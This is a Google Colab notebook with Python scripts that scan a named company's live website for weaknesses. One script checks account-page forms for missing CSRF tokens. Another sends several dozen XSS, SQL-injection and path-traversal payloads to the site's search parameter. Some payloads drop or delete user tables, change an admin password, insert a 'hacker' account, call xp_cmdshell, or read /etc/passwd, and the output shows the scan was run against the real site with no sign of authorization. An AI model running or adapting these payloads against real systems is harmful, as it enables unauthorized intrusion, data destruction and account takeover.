{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMYiNcSTFVrsvR+rr9JMxkx",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/4zan4/My-Lab/blob/main/XSS_Payload.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "u1gIRCfTI-Qv"
      },
      "outputs": [],
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "from urllib.parse import urljoin, quote"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "from urllib.parse import urljoin\n",
        "\n",
        "# Function to test the account page for common vulnerabilities\n",
        "def test_account_page_security(url):\n",
        "    try:\n",
        "        session = requests.Session()\n",
        "        response = session.get(url)\n",
        "\n",
        "        if response.status_code != 200:\n",
        "            return f\"Failed to access the account page. Status code: {response.status_code}\"\n",
        "\n",
        "        soup = BeautifulSoup(response.text, 'html.parser')\n",
        "        forms = soup.find_all('form')\n",
        "        potential_issues = []\n",
        "\n",
        "        # Check for CSRF vulnerabilities\n",
        "        for form in forms:\n",
        "            inputs = form.find_all('input')\n",
        "            csrf_token_found = any('csrf' in (input.get('name') or '').lower() for input in inputs)\n",
        "            if not csrf_token_found:\n",
        "                potential_issues.append(\"Potential CSRF vulnerability: No CSRF token found in form.\")\n",
        "\n",
        "        # Check for HTTPS usage\n",
        "        if not url.startswith(\"https\"):\n",
        "            potential_issues.append(\"Insecure connection: The URL is not using HTTPS.\")\n",
        "\n",
        "        # Test for insecure form actions and methods\n",
        "        for form in forms:\n",
        "            action = form.get('action')\n",
        "            method = form.get('method', 'get').lower()\n",
        "            if action and not action.startswith(\"https\"):\n",
        "                potential_issues.append(f\"Insecure form action: {action}\")\n",
        "\n",
        "            if method != 'post':\n",
        "                potential_issues.append(f\"Insecure form method: {method}\")\n",
        "\n",
        "        if potential_issues:\n",
        "            return potential_issues\n",
        "        else:\n",
        "            return \"No common vulnerabilities found.\"\n",
        "\n",
        "    except Exception as e:\n",
        "        return f\"An error occurred: {str(e)}\"\n",
        "\n",
        "# Example usage\n",
        "account_page_url = \"https://www.logitech.com/en-us/my-account.html\"\n",
        "results = test_account_page_security(account_page_url)\n",
        "for issue in results:\n",
        "    print(issue)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "sHMpZStIJRgf",
        "outputId": "25675499-f9ad-471c-a6e4-447ea5c33bbb"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Potential CSRF vulnerability: No CSRF token found in form.\n",
            "Potential CSRF vulnerability: No CSRF token found in form.\n",
            "Potential CSRF vulnerability: No CSRF token found in form.\n",
            "Insecure form action: /en-us/search.html\n",
            "Insecure form method: get\n",
            "Insecure form action: /content/logitech/amr/live/en_us/my-account.usersubscribeservice.json\n",
            "Insecure form method: get\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# prompt: write me List of payloads to test for vulnerabilities\n",
        "\n",
        "import requests\n",
        "from bs4 import BeautifulSoup\n",
        "from urllib.parse import urljoin, quote\n",
        "# Function to test for basic search-based vulnerabilities\n",
        "def test_search_vulnerability(base_url, payloads):\n",
        "    issues_found = []\n",
        "\n",
        "    for payload in payloads:\n",
        "        # Encoding the payload to be used in the URL\n",
        "        encoded_payload = quote(payload)\n",
        "        test_url = f\"{base_url}{encoded_payload}\"\n",
        "\n",
        "        try:\n",
        "            response = requests.get(test_url)\n",
        "            if payload in response.text:\n",
        "                issues_found.append(f\"Potential issue found with payload: {payload}\")\n",
        "\n",
        "        except Exception as e:\n",
        "            issues_found.append(f\"Error testing payload {payload}: {str(e)}\")\n",
        "\n",
        "    if issues_found:\n",
        "        return issues_found\n",
        "    else:\n",
        "        return \"No obvious vulnerabilities found.\"\n",
        "\n",
        "# Example usage\n",
        "search_url = \"https://www.logitech.com/en-us/products.html?sp=\"\n",
        "# List of payloads to test for vulnerabilities\n",
        "payloads = [\n",
        "    \"<script>alert('XSS')</script>\",\n",
        "    \"' OR '1'='1\",\n",
        "    \"<img src=x onerror=alert('XSS')>\",\n",
        "    \"admin'--\",\n",
        "    \"'; DROP TABLE users; --\",\n",
        "    \"1' OR '1'='1\",\n",
        "    \"union select 1,2,3\",\n",
        "    \"SELECT * FROM users\",\n",
        "    \"../../../../etc/passwd\",\n",
        "    \"../../../../windows/win.ini\",\n",
        "    \"../../../../../../../../../../../../../etc/passwd\",\n",
        "    \"1' AND 1=1 UNION SELECT 1,2,3--\",\n",
        "    \"1' AND SLEEP(5)--\", # For SQL injection time-based attack\n",
        "    \"/*\",\n",
        "    \"*/\",\n",
        "    \"/*\",\n",
        "    \"1' OR '1'='1'--\",\n",
        "    \"1'; DROP TABLE users;--\",\n",
        "    \"1'; SELECT * FROM users;--\",\n",
        "    \"1' UNION SELECT NULL,NULL--\",\n",
        "    \"1' OR 'a'='a\",\n",
        "    \"1' or 'a'='a\",\n",
        "    \"1' or 1=1 --\",\n",
        "    \"' or 1=1 --\",\n",
        "    \"' or ''='\",\n",
        "    \"' or 1=1#\",\n",
        "    \"test' OR '1'='1\",\n",
        "    \"test' OR '1'='1'--\",\n",
        "    \"test' UNION SELECT 1,2,3--\",\n",
        "    \"test' AND 1=0 UNION SELECT 1,2,3--\",\n",
        "    \"test' AND 1=1 UNION SELECT 1,2,3--\",\n",
        "    \"test'; DROP TABLE users;--\",\n",
        "    \"test'; SELECT * FROM users;--\",\n",
        "    \"test'; SELECT @@version;--\",\n",
        "    \"test'; SELECT user();--\",\n",
        "    \"test'; SHOW TABLES;--\",\n",
        "    \"test'; SHOW COLUMNS FROM users;--\",\n",
        "    \"test'; SELECT * FROM users WHERE username='admin';--\",\n",
        "    \"test' AND 1=1 AND username='admin'--\",\n",
        "    \"test' AND 1=1 AND username='admin' AND password='password'--\",\n",
        "    \"test' AND SLEEP(5)--\", # Time-based SQL injection\n",
        "    \"test' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--\", # Blind SQL injection\n",
        "    \"test'; DELETE FROM users;--\",\n",
        "    \"test'; UPDATE users SET password='newpassword' WHERE username='admin';--\",\n",
        "    \"test'; INSERT INTO users (username,password) VALUES ('hacker','password');--\",\n",
        "    \"test'; EXEC xp_cmdshell 'whoami';--\",\n",
        "    \"test%'; SELECT * FROM users WHERE username='admin'--\",\n",
        "    \"test%'; SELECT * FROM users WHERE username LIKE '%admin'--\"\n",
        "]\n",
        "\n",
        "results = test_search_vulnerability(search_url, payloads)\n",
        "for result in results:\n",
        "    print(result)\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "INwvJQfSKxiO",
        "outputId": "646af4ed-f09a-4948-f3d6-7d69bbac5370"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Potential issue found with payload: /*\n",
            "Potential issue found with payload: */\n",
            "Potential issue found with payload: /*\n"
          ]
        }
      ]
    }
  ]
}